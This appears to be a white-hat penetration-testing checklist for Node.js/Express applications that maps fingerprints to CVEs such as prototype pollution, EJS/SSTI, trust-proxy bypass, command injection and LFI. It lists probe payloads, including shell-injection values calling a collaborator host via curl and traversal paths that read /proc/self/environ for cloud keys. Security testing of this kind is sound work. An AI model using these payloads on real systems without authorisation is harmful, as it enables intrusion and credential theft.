# Node.js / Express — fingerprint→CVE reflex

> Identified Node.js/Express/Fastify/Koa → reflex: prototype-pollution + SSTI + trust-proxy + dependency-CVE.
> White-hat: read-only; confirm RCE chains with an OOB callback (pollution/SSTI are a primitive, Critical only
> when a reachable sink is hit). Do not build a weaponized gadget chain — detect via OOB.

## Fingerprint

- **Headers:** `X-Powered-By: Express` (or absent for Fastify/Koa); Node stack traces with `.js` paths.
- **Body:** `Cannot GET /path` (Express 404); a JSON error with `stack` under a non-prod NODE_ENV.
- **Paths:** `/package.json`, `/package-lock.json`, `/node_modules/.package-lock.json` (dep graph + versions),
  `/.git/`, `/debug` / inspector port (`9229`).

## Known-CVE reflexes

- **Prototype pollution (the class — root cause) → RCE/authz-bypass.**
  - Class: `__proto__`/`constructor.prototype` in JSON/query reaches a recursive-merge (`lodash.merge`,
    `Object.assign`, `qs`, `cookie-parser`) → pollutes Object.prototype → reaches a sink
    (`child_process` options `shell`/`env`/`NODE_OPTIONS`, EJS opts, template).
  - Check: `POST {"__proto__":{"polluted":"yes"}}` / `?__proto__[polluted]=yes` → then `GET /api/me`
    reflects `polluted`/`isAdmin` without you sending it = pollution confirmed.
  - Detection Signal: the polluted key visible in a later response = primitive. Sink reachability (RCE) via
    OOB callback. FP-guard: pollution without a gadget != RCE.

- **`lodash` pollution/template — CVE-2021-23337** (`lodash <4.17.21`, `_.template`),
  **CVE-2019-10744** (`lodash <4.17.12`, `defaultsDeep`).
  - Class: `_.template` with a polluted `sourceURL`/options → SSJI-RCE; `defaultsDeep` → prototype pollution.
  - Check: lodash version from `/package-lock.json`; the pollution probe (above).
  - Detection Signal: a vulnerable version + confirmed pollution → sink-OOB.

- **EJS SSTI/opts-pollution — CVE-2022-29078** (`ejs <3.1.7`).
  - Class: user input in `render()` options → `outputFunctionName`/`escapeFunction` injection →
    `process.mainModule.require('child_process')`-class RCE.
  - Check: ejs version; `{"template":"<%= 7*7 %>"}` → `49`? RCE — OOB `curl <collab>`.
  - Detection Signal: `49` = SSTI eval; an OOB hit = RCE. Cross-ref `payloads/` ssti.

- **Template-engine SSTI (the class) — Pug / Handlebars / EJS.**
  - Class: user input reaches template compilation → RCE (Handlebars — via a prototype-pollution
    lookup gadget; Pug — `root.process`).
  - Check: `<%= 7*7 %>` / `#{7*7}` / `{{7*7}}` per engine; confirm RCE via OOB.
  - Detection Signal: arithmetic evaluated + an OOB callback.

- **Express `trust proxy` misconfig (the class).**
  - Class: `app.set('trust proxy', true)` without validation → `X-Forwarded-For` is trusted → bypass of an
    IP allowlist/localhost gate/rate-limit (rotating fake IPs).
  - Check: `-H "X-Forwarded-For: 127.0.0.1"` against an internal/admin gate; rotate `1.2.3.$i` against a
    login rate-limit.
  - Detection Signal: a spoofed IP accepted (gate bypass) = Medium (auth/rate-limit bypass).

- **child_process command-injection (the class).**
  - Class: user input interpolated into a shell string (`exec`, `execSync` with `shell:true`) → OS injection.
  - Check: endpoints `/api/ping|convert|exec|scan` → `?host=127.0.0.1;id` / `$(curl <collab>)` (OOB, no
    destructive action).
  - Detection Signal: an OOB callback / `id` output = RCE. Cross-ref `payloads/` rce.

- **LFI → `/proc/self/environ` / require-traversal (the class).**
  - Class: path traversal on a static file / `res.sendFile` / `require(userPath)` → read env (cloud keys),
    load attacker JS as a module.
  - Check: `?path=/proc/self/environ`, `?file=../../../../proc/self/environ`, `/proc/self/cmdline`.
  - Detection Signal: an env dump with `AWS_ACCESS_KEY_ID`/secrets = High (cloud compromise with live creds).

- **Exposed inspector / `package.json` (info disclosure).**
  - Class: an `--inspect` port (`9229`) exposed = RCE via the debugger; `/package.json` → exact versions for
    dependency-CVE lookup.
  - Check: `curl "/package.json"`; probe `9229`/`/json/list` inspector endpoint.
  - Detection Signal: a reachable inspector = Critical; the version graph = a seed for dep-CVE.
